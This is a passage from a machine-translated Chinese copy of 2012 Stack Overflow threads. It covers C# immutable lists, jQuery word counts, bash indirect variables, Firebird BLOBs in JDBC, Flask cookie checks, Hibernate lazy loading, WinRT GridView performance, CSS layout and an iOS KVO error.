              "Enumerable must not be null and must have at least one element");
        Next = elements.Count() == 1 
           ? null 
           : new ReadOnlyNode<T>(elements.Skip(1), this);
        Value = elements.First();
        Prev = prev;
    }

    public ReadOnlyNode(IEnumerable<T> elements)
        : this(elements, null)
    {
    }
}

//Usage - creates an immutable doubly-linked list of integers from 1 to 1000
var immutableList = new ReadOnlyNode<int>(Enumerable.Range(1,1000)); 
```

您可以将它与任何实现 IEnumerable 的集合一起使用（几乎所有内置集合都可以，并且您可以使用 OfType() 将非泛型 ICollections 和 IEnumerables 转换为泛型 IEnumerables）。唯一需要担心的是调用堆栈；您可以嵌套多少方法调用是有限制的，这可能会导致 SOE 出现在有限但很大的输入列表上。

**编辑：** JaredPar 提出了一个很好的观点；此解决方案使用 Count() 和 Any() ，它们必须考虑 Skip() 的结果，因此不能使用这些方法中内置的“快捷方式”，这些方法可以使用集合类的基数属性。这些调用变成线性的，这使算法的复杂性平方。如果您只使用 IEnumerable 的基本成员，这将变得更加高效：

```
public class ReadOnlyNode<T>
{
    public readonly T Value;
    public readonly ReadOnlyNode<T> Next;
    public readonly ReadOnlyNode<T> Prev;

    private ReadOnlyNode(IEnumerator<T> elements, ReadOnlyNode<T> prev, bool first)
    {
        if (elements == null) throw new ArgumentNullException("elements");

        var empty = false;
        if (first) 
           empty = elements.MoveNext();

        if(!empty)
        {
           Value = elements.Current;
           Next = elements.MoveNext() ? new ReadOnlyNode<T>(elements, this, false) : null;
           Prev = prev;
        }
    }

    public ReadOnlyNode(IEnumerable<T> elements)
        : this(elements.GetEnumerator(), null, true)
    {
    }
} 
```

使用此解决方案，您将失去一些更优雅的错误检查，但如果 IEnumerable 为空，则无论如何都会引发异常。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-25T15:46:21.997

是的，您可以创建一个用于设置链接的“link-setter”对象，将其发送到节点的构造函数中，或者拥有一个返回“link-setter”的静态创建方法。节点中的链接是私有的，只能通过“链接设置器”访问，当您使用它们设置列表时，您将它们丢弃。

然而，这是一个相当无用的练习。如果列表是不可变的，那么当简单数组效果更好时，使用双向链表是没有意义的。

# jquery - 每个条目的jQuery字数

> ID：10757379
> 
> 赞同：1
> 
> 时间：2012-05-25T15:40:09.890
> 
> 标签：jquery, count

我正在开发一个博客主题，该主题对每篇文章的每个条目都有字数。我可以让字数统计工作，但它只适用于第一个条目，然后为每个帖子显示相同的字数。我需要修改下面的脚本以找到最接近的`div.entrycontent`并计算其中的单词，但对于每个条目。以下是我的条目标记代码，如果有人可以提供帮助，将不胜感激。

```
<div class="entry">
    <div class="entryinfo">
        <script type="text/javascript">
            var text = $('.entrycontent').text();
            var wordCount = text.split(' ').length;
            $("span.words").text(wordCount + ' words');
        </script>
        <span class="words"></span>
    </div>
    <div class="entrycontent">
        Lorem ipsum dolor amet...
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:43:29.460

您需要循环使用`.each()`.

将此脚本放在页面上一次，在块内的底部或顶部`$(document).ready(function(){...});`：

```
$('.entry').each(function(i,el) {
    var $entry = $(this),
        text = $entry.find('.entrycontent').text(),
        wordCount = text.split(' ').length;
    $entry.find("span.words").text(wordCount + ' words');
    $entry.find("span.chars").text(charCount); // IDs must be unique, use classes instead
}); 
```

**更新**

当`$entry.find('.entrycontent').text()`包含大量空格时，无论是否分隔单词，它都会在每个空格字符上进行拆分。试试这个：

```
$('.entry').each(function(i,el) {
    var $entry = $(this),
        text = $entry.find('.entrycontent').text(),
        wordCount = text.split(/\s+/).length;
    $entry.find("span.words").text(wordCount + ' words');
}); 
```

[`.split()`文档](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/split)

**更新 2**

好吧，如果你想要一个真正的字数，我想我们应该使用[`.match()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/match)而不是`.split()`：

```
$('.entry').each(function(i,el) {
    var $entry = $(this),
        text = $entry.find('.entrycontent').text(),
        marr = text.match(/\w+/g) || [],  // null if no matches
        wordCount = marr.length;
    $entry.find("span.words").text(wordCount + ' words');
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:43:43.247

```
$('.entry').each(function() {
 var text = $(".entrycontent", this).text(),
     wordCount = text.split(/\s+/).length;
 $("span.words", this).text(wordCount + ' words');
 $("span#chars", this).text(charCount);
}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:49:44.880

它可能与您的选择器绑定到任何具有 entrycontent 类的元素有关。

我建议像这样遍历每个条目：

```
$(".entrycontent").each(function() {
    var entryInfo = $(this).prev();
    var text = $(this).text(); 
    var wordCount = text.split(' ').length;  
    entryInfo.find("span.words").text(wordCount + ' words');  
}); 
```

# bash - Bash - 变量变量

> ID：10757380
> 
> 赞同：52
> 
> 时间：2012-05-25T15:40:10.690
> 
> 标签：bash, variables

我有变量`$foo="something"`并想使用：

```
bar="foo"; echo $($bar) 
```

让“某事”得到回应。

* * *

## 回答 #1

> 赞同：95
> 
> 时间：2012-05-25T15:49:08.250

在 bash 中，您可以使用`${!variable}`可变变量。

```
foo="something"
bar="foo"
echo "${!bar}"

# something 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-05-25T15:44:52.573

`eval echo \"\$$bar\"`会做的。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2014-08-06T18:10:49.070

接受的答案很棒。但是，@Edison 询问如何对数组执行相同的操作。诀窍是您希望您的变量包含“[@]”，以便使用“！”扩展数组。查看此函数以转储变量：

```
$ function dump_variables() {
    for var in "$@"; do
        echo "$var=${!var}"
    done
}
$ STRING="Hello World"
$ ARRAY=("ab" "cd")
$ dump_variables STRING ARRAY ARRAY[@] 
```

这输出：

```
STRING=Hello World
ARRAY=ab
ARRAY[@]=ab cd 
```

当作为 just 给出时`ARRAY`，第一个元素显示为由 . 扩展的内容`!`。通过给出`ARRAY[@]`格式，您可以扩展数组及其所有值。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-05-16T05:56:24.273

为了更清楚如何处理数组：

```
arr=( 'a' 'b' 'c' )
# construct a var assigning the string representation 
# of the variable (array) as its value:
var=arr[@]         
echo "${!var}" 
```

# java - 插入和恢复 BLOB 值 SubType = Text Field Firebird Java

> ID：10757387
> 
> 赞同：0
> 
> 时间：2012-05-25T15:40:40.487
> 
> 标签：java, jdbc, firebird

我正在构建一个项目，但遇到了在数据库 Firebird 中创建的 Blob 字段的问题。这个字段是指一个字段观察，我不想限制用户输入的文本数量。

但是我有一个问题，不知道如何保存和阅读该字段。

我正在使用 JDBC 使用 insert prepareStatement stmt stmt.set ... - 对于 blob 不知道该怎么做，也不知道如何转换字段的字符串值

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-26T07:02:50.717

您可以使用`PreparedStatement.setString()`and如果您使用(aka ) `ResultSet.getString()`，Firebird 驱动程序将为您将其转换为 blob 或从 blob 转换。您确实需要确保您的连接字符集与 blob 字符集相同，否则您可能会得到不正确的字符集转换。`BLOB SUB_TYPE 1``BLOB SUB_TYPE TEXT`

其他选项是显式创建一个 Clob（使用`Connection.createClob()`）并将其设置在语句上，或者使用该`setCharacterStream`方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:02:56.433

要将字符串转换为 blob，我找到[了以下示例](http://studyjava.org/client-side-scripts/convert-string-to-blob-and-blob-to-string)：

```
//Convert String to Blob
String data = “hello world”;
java.sql.Blob blob = org.hibernate.Hibernate.createBlob(data.getBytes());

//Convert Blob to String
byte[] bdata = blob.getBytes(1, (int)blob.length());
String data1 = new String(bdata); 
```

查看[此示例](http://www.java2s.com/Code/Java/Database-SQL-JDBC/DemoPreparedStatementSetBlob.htm) `setBlob`以获取准备好的语句。这是一块。从他们的示例看来，您可以`setBlob`调用`PreparedStatement`

```
java.sql.Blob blob = null;
try {
  conn = getConnection();
  // prepare blob object from an existing binary column
  pstmt = conn.prepareStatement("select photo from my_pictures where id = ?");
  pstmt.setString(1, "0001");
  rs = pstmt.executeQuery();
  rs.next();
  blob = rs.getBlob(1);

  // prepare SQL query for inserting a new row using setBlob()
  String query = "insert into blob_table(id, blob_column) values(?, ?)";
  // begin transaction
  conn.setAutoCommit(false);

  pstmt = conn.prepareStatement(query);
  pstmt.setString(1, "0002");
  pstmt.setBlob(2, blob);

  int rowCount = pstmt.executeUpdate();
  System.out.println("rowCount=" + rowCount);
  // end transaction
  conn.commit(); 
```

# java - Hamcrest allOf() 的签名是否错误？

> ID：10757390
> 
> 赞同：3
> 
> 时间：2012-05-25T15:40:42.997
> 
> 标签：java, junit, hamcrest

此匹配器检查一组匹配器，如果它们都成功则成功。

签名内容如下：

```
public static <T> Matcher<T> allOf(Iterable<Matcher<? extends T>> matchers) 
```

为什么这需要一个可迭代的
     `Matcher<? extends T>`

并不是
     `Matcher<? super t>`

如果它是正确的，请解释。

类型将从被匹配（测试）的对象中推断出来，所以我希望迭代器持有与被匹配对象或其任何超类兼容的匹配器。同样，允许可迭代对象保存仅与子类兼容的匹配器似乎是错误的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T16:08:47.147

（回答自己的问题）

我的坏 - 不小心使用了旧版本。这在 2007年的 Hamcrest 1.2 中得到[了修复。](http://code.google.com/p/hamcrest/source/diff?spec=svn194&r=194&format=side&path=/trunk/hamcrest-java/hamcrest-core/src/main/java/org/hamcrest/core/AllOf.java)但是在 2012 年 12 月发布的 JUnit 4.11 之前，旧的“扩展”版本一直包含在 JUnit 中。

# java - 如何交替读取列表中的元素？

> ID：10757391
> 
> 赞同：0
> 
> 时间：2012-05-25T15:40:44.493
> 
> 标签：java

嗨，我定义了 2 个列表：

```
ArrayList<JLabel> questionsList = new ArrayList<JLabel>();
ArrayList<JRadioButton> answersList = new ArrayList<JRadioButton>(); 
```

我尝试以如下格式阅读问题和答案：

```
1st Question 
  answer1
  answer2

2nd Question 
  answer1
  answer2
etc. 
```

所以第一个问题是从列表**questionsList**中读取的，然后我想从另一个列表**answersList**中读取该问题的所有答案等等。

在 questionsList 中，我从 mysql 读取数据并将它们保存在 JLabels 中，格式如下：
1.问题一
2.问题
二等

在 answersList 我从 mysql 读取数据，它们以如下格式保存在 JRadioButtons 中：
answer1
answer2
等

到目前为止我的代码：

```
 int height = 0;

        for(int i1 =0; i1<questionsList.size(); i1++)
        {   
              client.insideFillPollPanel.add(questionsList.get(i1)).setBounds(20, 20+150*i1, 480, 14);

            height = 20+150*i1;  

            for(int i2 =0; i2<answersList.size(); i2++)
            client.insideFillPollPanel.add(answersList.get(i2)).setBounds(20, 50+30*i2, 480, 14);

        } 
```

我如何解决它以像我展示的第一种格式那样显示问题然后回答问题和回答？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:43:21.627

我建议您创建一个`Question`包含问题和属于该问题的所有答案的类，然后，而不是

```
ArrayList<JLabel> questionsList = new ArrayList<JLabel>();
ArrayList<JRadioButton> answersList = new ArrayList<JRadioButton>(); 
```

你用

```
ArrayList<Question> questions = new ArrayList<Question>(); 
```

（作为旁注：针对接口进行编程被认为是一种很好的做法，因此`ArrayList<Question>`我建议您不要将问题存储在 a 中`List<Question>`。）

* * *

例如：

```
class Question {

    JLabel questionLabel;
    List<JRadioButton> answers;

    public Question(String q, String... ans) {
        ...
    }
} 
```

# python - 如何使用 Flask 验证 cookie 的完整性？

> ID：10757392
> 
> 赞同：1
> 
> 时间：2012-05-25T15:40:49.300
> 
> 标签：python, cookies, flask

使用烧瓶，我试图验证一个 cookie 没有被篡改。现在，如果我更改 cookie 值，它只会引发错误，但我想检查代码 is_valid(session['user_id']) 并重定向/重置，否则。

#pocoo 中的某个人说：

> *   实际上，您可以调用 SecureCookie.unserialize 并捕获异常
> *   啊，它默默地失败了
> *   看起来你必须尝试反序列化它并检查你是否从中得到一个空对象

谁能进一步解释这段代码会是什么样子？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:03:59.853

看看[https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/contrib/securecookie.py#L265](https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/contrib/securecookie.py#L265)

`safe_str_cmp(client_hash, mac.digest())`正在执行如果 cookie 已被篡改则应该失败的检查。

根据您想要捕捉的内容，您可以跳入不同的地方。你可以做

```
data = request.cookies.get("session")
cookie = werkzeug.contrib.securecookie.SecureCookie.unserialize(data, secret_key) 
```

如果存在`data`且不`cookie`包含任何数据，则反序列化失败。许多原因之一是`safe_str_cmp()`（被调用`unserialize()`）返回 False。

# java - Hibernate 映射中的最佳获取实践（多对一）

> ID：10757393
> 
> 赞同：1
> 
> 时间：2012-05-25T15:40:53.510
> 
> 标签：java, hibernate

我在使用休眠模式进行多对一映射时遇到问题。我有两个表，表 A 和表 B。我映射了这些表之间的多对一关系。两个表可以一起使用，也可以单独使用。

表在 Java 中的类表示，例如：

```
class A{ 
 private B b; 
 private Integer val1; 
 private Integer val2; 
 private Integer val3; 
}

class B{
 private Integer val1;
 private Integer val2;
 private Integer val3;
} 
```

问题是每当我尝试从表 A 中检索/获取记录时，hibernate 也会一直从表 B 中获取我不想要的记录。它导致性能问题。他们有什么办法来处理这种情况吗？

请用适当的答案指导我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:50:06.047

```
@ManyToOne(lazy = true)
private B b; 
```

是你所需要的全部。阅读[休眠文档](http://docs.jboss.org/hibernate/core/3.6/reference/en-US/html_single/#performance-fetching-lazy)以获取更多详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-29T11:02:14.943

您的要求符合`Lazy Initialization`. 为了实现它，您可以添加注释，或者在检索数据时可以使用休眠会话的`get`方法。

在你的情况下，你可以这样写：

```
Session session = SessionFactory.getCurrentSession();
A aObject= (A) session.get(A.class, A_ID); 
```

如本[https://community.jboss.org/wiki/AShortPrimerOnFetchingStrategies?_sscc=t](https://community.jboss.org/wiki/AShortPrimerOnFetchingStrategies?_sscc=t)链接所述：

如果您通过 get() 或 load() 通过标识符检索它，Hibernate3 会加载单个实体实例。不加载为此实体映射的所有集合以及所有关联实体，无论是通过多对多还是一对一关联。

# xaml - XAML 将一个值绑定到 GridView 中的多个元素的性能（Windows 8）

> ID：10757394
> 
> 赞同：1
> 
> 时间：2012-05-25T15:40:56.820
> 
> 标签：xaml, windows-8, windows-runtime, winrt-xaml

我有一个带有网格的 Windows 8 XAML 页面，其中显示了 100 多种不同字体的示例文本。每个网格视图项中的示例文本都是相同的，并且可以使用页面顶部的文本框进行更改。

每次您键入一个字符时，所有网格视图项都会更新。问题是这明显很慢。特别是如果您快速打字。

我不确定是什么让它这么慢。它是否更新了所有网格视图项目，包括不在屏幕上的项目？是其他什么原因导致了这个问题，而这个特殊的绑定只是一个红鲱鱼？

这是我的绑定代码（我从数据模板中删除了一些 xaml 以使其更清晰）：

```
<ScrollViewer>
    <GridView x:Name="FontGridView" ItemsSource="{Binding Fonts}" SelectionMode="Multiple"  Margin="116,0,40,46">
        <GridView.ItemTemplate>
            <DataTemplate>
                <Grid Width="600" MinHeight="100" MaxHeight="120">
                    <TextBox Text="{Binding ElementName=pageRoot, Path=DataContext.SampleText, Mode=OneWay}"
                                FontFamily="{Binding FamilyName}" FontSize="32" Background="Transparent" />
                </Grid>
            </DataTemplate>
        </GridView.ItemTemplate>
    </GridView>
</ScrollViewer> 
```

有没有更好的方法来做到这一点，或者我可以打开任何其他性能调整的东西吗？

**更新：**自从 Visual Studio 2012 RC 发布以来，您不太可能犯此错误。WinRT 应用程序的模板不再以这种方式使用 ScrollViewer。对于那些移植了他们使用 Visual Studio 2011 创建的应用程序的人，我在这里保留了这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T23:51:08.940

尝试删除 ScrollViewer。

因为 GridView 在滚动查看器内部，所以它实际上被赋予了无限的宽度。这可能会杀死 GridView 中 WrapGrid 的虚拟化。

此外，GridView 内部已经包含一个 ScrollViewer。显然，您不需要其中两个。但是内部的 ScrollViewer 也会吃掉鼠标滚轮事件，而没有给外部 ScrollViewer 做出反应的事件。因此，用鼠标滚动将不起作用。

Visual Studio 11 (bèta 1) 模板包含这样的代码，用于在 GridView 上设置边距。但是，最好在 GridView 的 ItemsPanel 上设置一个边距，如下所示：

```
<GridView x:Name="FontGridView" ItemsSource="{Binding Fonts}" SelectionMode="Multiple">
  <GridView.ItemTemplate>
    <DataTemplate>
      <Grid Width="600" MinHeight="100" MaxHeight="120">
        <TextBox Text="{Binding ElementName=pageRoot, Path=DataContext.SampleText, Mode=OneWay}"
                 FontFamily="{Binding FamilyName}" FontSize="32" Background="Transparent" />
      </Grid>
    </DataTemplate>
  </GridView.ItemTemplate>
  <GridView.ItemsPanel>
    <ItemsPanelTemplate>
      <WrapGrid x:Name="itemGridViewPanel" Margin="116,53,116,46"/>
    </ItemsPanelTemplate>
  </GridView.ItemsPanel>
</GridView> 
```

您的原始代码不包括您在 GridView 上设置的边距。但不管它是什么，在 WrapGrid 上设置相同的边距。

另请注意，我给 WrapGrid 起了一个名字。您可以使用该名称在屏幕方向更改时更改边距，通常如下所示：

```
<VisualStateManager.VisualStateGroups>
  <VisualStateGroup>
    <VisualState x:Name="FullScreenLandscape"/>
    <VisualState x:Name="Filled"/>
    <VisualState x:Name="FullScreenPortrait">
      <Storyboard>
        <ObjectAnimationUsingKeyFrames Storyboard.TargetName="itemGridViewPanel"
                                       Storyboard.TargetProperty="Margin">
          <DiscreteObjectKeyFrame KeyTime="0" 
                                  Value="96,53,96,46"/>
        </ObjectAnimationUsingKeyFrames>
      </Storyboard>
    </VisualState>
    <VisualState x:Name="Snapped"/>
  </VisualStateGroup>
</VisualStateManager.VisualStateGroups> 
```

**更新：**

我以前做过这个，但是使用了 VariableSizedWrapGrid。这会产生正确的布局，但不幸的是，我担心 VariableSizedWrapGrid 不是虚拟化面板。

WrapGrid 正在虚拟化，但滚动时左边距的行为似乎错误。但它在右边距是正确的。

哦，好吧，在两周内，我们应该有可用的候选版本。希望情况会有所改善...

**更新：**

微软似乎意识到了这一点。请参阅[http://social.msdn.microsoft.com/Forums/en-US/winappswithcsharp/thread/17385f7d-aadc-4edc-bbff-8738a2f0c917](http://social.msdn.microsoft.com/Forums/en-US/winappswithcsharp/thread/17385f7d-aadc-4edc-bbff-8738a2f0c917)。

**更新：**

似乎 WrapGrid 尚未在候选版本中修复。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T19:23:49.037

简化您的数据模板。

```
<DataTemplate>
  <TextBlock Text="{Binding ElementName=pageRoot, Path=DataContext.SampleText}"
             Width="600" MinHeight="100" MaxHeight="120"
             FontFamily="{Binding FamilyName}" FontSize="32" />
</DataTemplate> 
```

你不需要网格。看起来你也不需要一个（复杂的）TextBox，只需要一个（简单的）TextBlock。

此外，固定这些文本块 ( ) 的高度`Height="120"`可能有助于（优化）布局过程。

**更新：**

我知道你的代码是从“真实的东西”简化而来的。但这可能隐藏了我们真正的问题。请记住，数据模板针对屏幕上的每个项目进行了实例化。越复杂，需要实例化的对象就越多（CPU 和内存使用），可能需要数据绑定（CPU），需要测量和布局（CPU），需要渲染（CPU 和 GPU）。

只需使用非常简单的数据模板进行测试。如果你的程序现在更快了，或者不是，你知道数据模板是否是性能问题。

请注意，数据模板的复杂性不是通过您需要描述它的 xaml 元素的数量来衡量的，因为这些元素可能具有非常不同的内部复杂性。例如，如果您需要做的只是显示文本，不允许编辑，则更喜欢 TextBlock 而不是 TextBox。

此外，如果其中一些元素设置了很多属性，请使用样式来设置它们。在许多对象上使用样式比在许多对象上设置许多属性更有效，尤其是在内存使用方面。而且您使用的内存越少，您的程序就会越快（由于现代 CPU 多级缓存架构）。

例如：

```
<GridView x:Name="FontGridView" ItemsSource="{Binding Fonts}" SelectionMode="Multiple">
  <GridView.Resources>
    <Style TargetType="TextBlock">
      <Setter Property="Width" Value="600" />
      <Setter Property="MinHeight" Value="100" />
      <Setter Property="MaxHeight" Value="120" />
      <Setter Property="FontSize" Value="32" />
    </Style>
  </GridView.Resources>
  <GridView.ItemTemplate>
    <DataTemplate>
      <TextBlock Text="{Binding ElementName=pageRoot, Path=DataContext.SampleText}"
                 FontFamily="{Binding FamilyName}" />
    </DataTemplate>
  </GridView.ItemTemplate>
</GridView> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T17:30:30.580

尝试使用 VirtualizingStackPanel

```
<GridView.ItemsPanel>
    <ItemsPanelTemplate>
        <VirtualizingStackPanel Orientation="Horizontal"/>
    </ItemsPanelTemplate>
</GridView.ItemsPanel> 
```

# firewall - 防火墙类型（操作系统和软件）

> ID：10757398
> 
> 赞同：-2
> 
> 时间：2012-05-25T15:41:12.937
> 
> 标签：firewall

操作系统防火墙和软件防火墙有什么区别？我搜索了很多，但我没有找到一个好的答案，请问有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:42:50.207

操作系统防火墙是您的操作系统附带的内置防火墙，例如 Windows 防火墙。

软件防火墙是您单独购买的防火墙，例如 Norton Firewall 或类似的东西。

我本来希望这个问题是硬件和软件防火墙之间的区别。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:53:34.707

操作系统防火墙是您的操作系统附带的防火墙，例如 Windows 防火墙。

软件防火墙是您单独下载的防火墙，例如 Norton Firewall...

# html - 超出页面布局（高度）的 CSS 边距

> ID：10757399
> 
> 赞同：0
> 
> 时间：2012-05-25T15:41:26.743
> 
> 标签：html, css, padding, margin

这是让我感到沮丧的页面的链接：[www.kbay.in](http://kbay.in)

我尝试在 style.css 文件中查找所有内容...'但似乎我总是得到空白结果'...您可以看到页面超出即使在页脚结束后...我不知道是什么它是..任何帮助将不胜感激..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:57:45.080

在您的 HTML 中，您的`<div id="header">`contains `<ul id="menu12">`. 其中，有；

```
<li class="menu_right"><div class="dropdown_3columns align_right"><div class="col_1"><table> 
```

在此表中，有大量行导致页面过长。删除它会阻止它尽可能多地拉伸。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:02:40.440

问题是标题 ul 中 div.dropdown_3 列中的表。

```
$('#header #menu12 .dropdown_3columns table').hide() 
```

.dropdown_3columns 似乎在页外（左：-999em）并占据了足够的垂直高度以将您的页面推到页脚下方。

如果你想看到罪魁祸首：

```
$('#header #menu12 .dropdown_3columns').css('left', 0); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:50:00.997

摆脱硬编码的宽度

```
<div style="width: 1200px; min-width: 1200px;" class="page_margins_search"> 
```

并添加隐藏到这个类的溢出应该可以工作

```
.page_margins_search{
    margin: 0 auto;
    overflow: hidden;
    text-align: left;
   width: 1200px;
} 
```

# iphone - 使用 ARC 和 UITableViewController 会抛出观察信息被泄露，甚至可能被错误地附加到其他对象

> ID：10757400
> 
> 赞同：0
> 
> 时间：2012-05-25T15:41:29.160
> 
> 标签：iphone, objective-c, xcode4.2, automatic-ref-counting

我似乎无法弄清楚如何解决我收到的这个错误。我单击一个单元格，它将一个新的 UITableViewController 弹出到堆栈中。在此控制器中单击导航 UI 上的后退按钮后，我在调试器中收到此错误，但应用程序似乎没有任何问题，因为它不会崩溃或挂起并且仍然可以正常工作。

UITableView 类的实例 0x79a8400 已被释放，而键值观察者仍向其注册。观察信息被泄露，甚至可能被错误地附加到其他对象上。在 NSKVODeallocateBreak 上设置断点以在调试器中停止。这是当前的观察信息：（上下文：0x0，属性：0x738c010>）

代码如下，我在其他 UITableViewControllers 上使用了类似的代码，但没有收到错误。

```
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) 
    {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad
{
    [super viewDidLoad];
// Do any additional setup after loading the view.
    pull = [[PullToRefreshView alloc] initWithScrollView:(UIScrollView *) self.tableView];
    [pull setDelegate:self];
    [self.tableView addSubview:pull];
    [tableView.dataSource self];
    [tableView.delegate self];

    NSString *isAuthenticated = [[NSString alloc] init];
    isAuthenticated = [self retrieveUserToken:[[NSUserDefaults standardUserDefaults] valueForKey:@"email"]];
    NSNumber *categorySelected = [[NSNumber alloc] init];
    categorySelected = [[NSUserDefaults standardUserDefaults] valueForKey:@"category_id"];
    if (![isAuthenticated length])
    {
         UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Alert" message:@"Message" delegate:self cancelButtonTitle:@"Dismiss" otherButtonTitles:nil, nil];
         [alert show];
         return;
    }else if (categorySelected ==nil) 
    {
         UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"alert" message:@"message" delegate:self cancelButtonTitle:@"Dismiss" otherButtonTitles:nil, nil];
         [alert show];
         return;
    }

         [self getTableViewData];
    }

 - (void)viewDidUnload
 {
     [self setTableView:nil];
     pull = nil;
     [super viewDidUnload];
     // Release any retained subviews of the main view.
 }

 - (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
 {
     return (interfaceOrientation == UIInterfaceOrientationPortrait);
 }

 - (NSString *)retrieveUserToken:(NSString *)user
 {
     NSError *error = nil;
     NSString *username = user;
     return [SFHFKeychainUtils getPasswordForUsername:username  andServiceName:@"app" error:&error];
 }

 - (void)getTableViewData 
 {
     URLSingleton *urls = [[URLSingleton alloc] init];
     responseData = [NSMutableData data];
     NSNumber *categoryID = [[NSNumber alloc] init];
     categoryID = [[NSUserDefaults standardUserDefaults] valueForKey:@"category_id"];

     NSString *urlComplete = [[NSString alloc] init];
     urlComplete = [urls getEvent:categoryID];
     NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:urlComplete]];
     NSURLConnection *connection = [[NSURLConnection alloc] initWithRequest:request delegate:self];
     [UIApplication sharedApplication].networkActivityIndicatorVisible = YES;
     [connection start];
 }

 - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section 
 {
     return categories.count;
 }  

 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath 
 {

     UITableViewCell *cell = [[UITableViewCell alloc]
                         initWithStyle:UITableViewCellStyleDefault
                         reuseIdentifier:@"cell"];

     cell.textLabel.textColor = [UIColor blackColor];
     cell.textLabel.text = [categories objectAtIndex:indexPath.row];
     return cell;
 }

 - (void)viewWillAppear:(BOOL)animated 
 {
     [super viewWillAppear:animated];
     [self.tableView reloadData]; 
 }

 - (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response
 {
     [responseData setLength:0];
 }

 - (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data {
     [responseData appendData:data];
 }

 - (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error
 {
     UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Alert" message:@"Message." delegate:self cancelButtonTitle:@"Dismiss" otherButtonTitles:nil, nil];
     [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
     [pull finishedLoading];
     [alert show];
 }

 - (void)connectionDidFinishLoading:(NSURLConnection *)connection
 {
     NSString *responseString = [[NSString alloc] initWithData:responseData encoding:NSUTF8StringEncoding];

     NSDictionary *dictionary = [responseString JSONValue];
     NSArray *response = [dictionary valueForKey:@"name"];
     NSArray *responseID = [dictionary valueForKey:@"id"];

     categories = [[NSMutableArray alloc] initWithArray:response];
     eventID = [[NSMutableArray alloc] initWithArray:responseID];
     [self.tableView performSelectorOnMainThread:@selector(reloadData) withObject:nil waitUntilDone:NO];
     [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
     [pull finishedLoading];
 } 

 - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath 
 {

     UITableViewCell *selectedCell = [self.tableView cellForRowAtIndexPath:indexPath];
     NSString *cellText = selectedCell.textLabel.text;
     int i = 0;
     for(NSString *name in categories)
     {
         if ([name isEqualToString:cellText]) 
         {
             [[NSUserDefaults standardUserDefaults] setValue:[eventID objectAtIndex:i] forKey:@"event_id"];
             [[NSUserDefaults standardUserDefaults] setValue:cellText forKey:@"event_name"];
             [[NSUserDefaults standardUserDefaults] synchronize];
         }
         i++;
     }

     [self.tableView deselectRowAtIndexPath:indexPath animated:YES];

     if(checkedIndexPath) {
         UITableViewCell* uncheckCell = [self.tableView
                                    cellForRowAtIndexPath:checkedIndexPath];
         uncheckCell.accessoryType = UITableViewCellAccessoryNone;
     }
      UITableViewCell* cell = [self.tableView cellForRowAtIndexPath:indexPath];
      cell.accessoryType = UITableViewCellAccessoryCheckmark;
      checkedIndexPath = indexPath;
  }

 -(void)tableView:(UITableView*)tableView willBeginEditingRowAtIndexPath:(NSIndexPath *)indexPath
 {

 }

 - (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath 
 {

     URLSingleton *urls = [URLSingleton sharedInstance];
     NSNumber *event = [[NSNumber alloc] init];
     if(editingStyle == UITableViewCellEditingStyleDelete)
     {  
         UITableViewCell *selectedCell = [self.tableView cellForRowAtIndexPath:indexPath];
         NSString *cellText = selectedCell.textLabel.text;
         int i = 0;
         for(NSString *name in categories)
         {
             if ([name isEqualToString:cellText]) 
             {
                 event = [eventID objectAtIndex:i];
                 [eventID removeObjectAtIndex:i];
             }
             i++;
         }

         NSString *reqURL = [[NSString alloc] initWithString:[urls deleteEvent:[event stringValue]]];
         NSURLRequest *delReq = [NSURLRequest requestWithURL:[NSURL URLWithString:reqURL]]; 
         NSURLResponse *resp = nil;
         NSError *err = nil; 
